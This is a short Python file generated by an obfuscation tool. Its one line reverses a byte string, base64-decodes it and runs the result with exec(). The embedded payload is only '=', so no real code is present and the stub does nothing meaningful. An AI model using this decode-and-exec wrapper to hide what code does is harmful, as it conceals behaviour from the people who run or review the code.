# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Mon Jul 10 01:55:27 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))